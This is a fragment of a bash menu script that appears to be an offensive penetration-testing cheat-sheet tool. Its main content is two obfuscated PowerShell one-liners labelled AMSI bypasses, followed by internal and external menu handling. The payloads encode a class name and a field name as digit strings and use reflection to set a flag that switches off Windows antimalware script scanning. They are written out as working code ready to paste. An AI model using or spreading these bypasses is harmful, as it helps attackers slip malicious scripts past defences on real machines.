echo -e "${LGREEN}AMSI Bypasses${RESTORE}"
echo -e ""
echo -e "${IBLUE}Bypass #1${RESTORE}"
echo -ne '
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref]."A`ss`Embly"."GET`TY`Pe"([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'\'NonPublic,Static\'').
SetValue($null,$true)
'
echo -e ""
echo -e "${IBLUE}Bypass #2${RESTORE}"
echo -ne '
$A="5492868772801748688168747280728187173688878280688776"
$B="8281173680867656877679866880867644817687416876797271"
function C($n, $m){
[string]($n..$m|%{[char][int](29+($A+$B).
    substring(($_*2),2))})-replace " "}
$k=C 0 37; $r=C 38 51
$a=[Ref].Assembly.GetType($k)
$a.GetField($r,'\'NonPublic,Static\'').SetValue($null,$true)
'
echo -e ""
echo -ne  "Return to Internal Main Menu?


        1)  ->  [ Internal Main Menu ]
"

        read a
        case $a in
        	1) Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Main_Menu(){

    clear

echo -ne "
            Main Menu

        1) -> Internal
        2) -> External (WIP)
"
        read a
        case $a in
	        1) Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

# Call the menu function
Main_Menu
